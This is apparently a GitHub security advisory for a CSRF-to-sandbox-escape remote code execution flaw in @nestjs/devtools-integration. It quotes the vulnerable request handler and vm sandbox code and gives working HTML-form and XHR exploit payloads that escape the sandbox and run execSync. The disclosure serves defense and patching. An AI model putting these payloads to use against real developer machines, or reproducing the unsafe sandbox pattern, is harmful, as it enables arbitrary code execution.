# [C] @nestjs/devtools-integration: CSRF to Sandbox Escape Allows for RCE against JS Developers

## Summary
Severity: Critical
Advisory: GHSA-85cg-cmq5-qjm7
CVE: CVE-2025-54782
CWE: CWE-352, CWE-77, CWE-78
Ecosystem: npm
CVSS: CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-08-01
Source: https://github.com/advisories/GHSA-85cg-cmq5-qjm7
Type: github-advisory

## Affected
- npm: `@nestjs/devtools-integration` — affected >=0 <0.2.1

## Details
## Summary
A critical Remote Code Execution (RCE) vulnerability was discovered in the `@nestjs/devtools-integration` package. When enabled, the package exposes a local development HTTP server with an API endpoint that uses an unsafe JavaScript sandbox (`safe-eval`-like implementation). Due to improper sandboxing and missing cross-origin protections, any malicious website visited by a developer can execute arbitrary code on their local machine.

A full blog post about how this vulnerability was uncovered can be found on [Socket's blog](https://socket.dev/blog/nestjs-rce-vuln).

## Details
The `@nestjs/devtools-integration` package adds HTTP endpoints to a locally running NestJS development server. One of these endpoints, `/inspector/graph/interact`, accepts JSON input containing a `code` field and executes the provided code in a Node.js `vm.runInNewContext` sandbox.

Key issues:
1. **Unsafe Sandbox:** The sandbox implementation closely resembles the abandoned `safe-eval` library. The Node.js `vm` module is [explicitly documented](https://nodejs.org/api/vm.html) as not providing a security mechanism for executing untrusted code. Numerous known sandbox escape techniques allow arbitrary code execution.
2. **Lack of Proper CORS/Origin Checking:** The server sets `Access-Control-Allow-Origin` to a fixed domain (`https://devtools.nestjs.com`) but does not validate the request's `Origin` or `Content-Type`. Attackers can craft POST requests with `text/plain` content type using HTML forms or simple XHR requests, bypassing CORS preflight checks.

By chaining these issues, a malicious website can trigger the vulnerable endpoint and achieve arbitrary code execution on a developer's machine running the NestJS devtools integration.

Relevant code from the package:

```js
// Vulnerable request handler
handleGraphInteraction(req, res) {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', data => { body += data; });
    req.on('end', async () => {
      res.writeHead(200, { 'Content-Type': 'application/plain' });
      const json = JSON.parse(body);
      await this.sandboxedCodeExecutor.execute(json.code, res);
    });
  }
}

// Vulnerable sandbox implementation
runInNewContext(code, context, opts) {
  const sandbox = {};
  const resultKey = 'SAFE_EVAL_' + Math.floor(Math.random() * 1000000);
  sandbox[resultKey] = {};
  const ctx = `
    (function() {
      Function = undefined;
      const keys = Object.getOwnPropertyNames(this).concat(['constructor']);
      keys.forEach((key) => {
        const item = this[key];
        if (!item || typeof item.constructor !== 'function') return;
        this[key].constructor = undefined;
      });
    })();
  `;
  code = ctx + resultKey + '=' + code;
  if (context) {
    Object.keys(context).forEach(key => { sandbox[key] = context[key]; });
  }
  vm.runInNewContext(code, sandbox, opts);
  return sandbox[resultKey];
}
```

Because the sandbox can be trivially escaped, and the endpoint accepts cross-origin POST requests without proper checks, this vulnerability allows arbitrary code execution on the developer's machine.

## PoC
Create a minimal NestJS project and enable @nestjs/devtools-integration in development mode:

```
npm install @nestjs/devtools-integration
npm run start:dev
```

Use the following HTML form on any malicious website:


```html
<form action="http://localhost:8000/inspector/graph/interact" method="POST" enctype="text/plain">
  <input name="{&quot;code&quot;:&quot;(function(){try{propertyIsEnumerable.call()}catch(pp){pp.constructor.constructor('return process')().mainModule.require('child_process').execSync('open /System/Applications/Calculator.app')}})()&quot;,&quot;bogus&quot;:&quot;" value="&quot;}" />
  <input type="submit" value="Exploit" />
</form>
```

When the developer visits the page and submits the form, the local NestJS devtools server executes the injected code, in this case launching the Calculator app on macOS.

Alternatively, the same payload can be sent via a simple XHR request with text/plain content type:

```html
<button onclick="sendPopCalculatorXHR()">Send pop calculator XHR Request</button>
<script>
    function sendPopCalculatorXHR() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost:8000/inspector/graph/interact");
        xhr.withCredentials = false;
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.send('{"code":"(function() { try{ propertyIsEnumerable.call(); } catch(pp){ pp.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'open /System/Applications/Calculator.app\'); } })()"}');
    }
</script>
```

### Full POC

Minimal reproducer: https://github.com/JLLeitschuh/nestjs-typescript-starter-w-devtools-integration

Steps to reproduce:

1. Clone Repo https://github.com/JLLeitschuh/nestjs-typescript-starter-w-devtools-integration
2. Run NPM install
3. Run `npm run start:dev`
4. Open up the POC site here: https://jlleitschuh.org/nestjs-devtools-integration-rce-poc/
5. Try out any of the POC payloads.

Source for the `nestjs-devtools-integration-rce-poc`: https://github.com/JLLeitschuh/nestjs-devtools-integration-rce-poc

## Impact

This vulnerability is a Remote Code Execution (RCE) affecting developers running a NestJS project with `@nestjs/devtools-integration` enabled. An attacker can exploit it by luring a developer to visit a malicious website, which then sends a crafted POST request to the local devtools HTTP server. This results in arbitrary code execution on the developer’s machine.

- Severity: Critical
- Attack Complexity: Low (requires only that the victim visits a malicious webpage, or be served malvertising)
- Privileges Required: None
- User Interaction: Minimal (no clicks required)

## Fix
The maintainers remediated this issue by:

 - Replacing the unsafe sandbox implementation with a safer alternative (@nyariv/sandboxjs).
 - Adding origin and content-type validation to incoming requests.
 - Introducing authentication for the devtools connection.

Users should upgrade to the patched version of @nestjs/devtools-integration as soon as possible.

## Credit

This vulnerability was uncovered by @JLLeitschuh on behalf of [Socket](https://socket.dev/).

## References
- https://github.com/nestjs/nest/security/advisories/GHSA-85cg-cmq5-qjm7
- https://nvd.nist.gov/vuln/detail/CVE-2025-54782
- https://github.com/JLLeitschuh/nestjs-devtools-integration-rce-poc
- https://github.com/JLLeitschuh/nestjs-typescript-starter-w-devtools-integration
- https://github.com/nestjs/nest
- https://jlleitschuh.org/nestjs-devtools-integration-rce-poc
- https://nodejs.org/api/vm.html
- https://socket.dev/blog/nestjs-rce-vuln
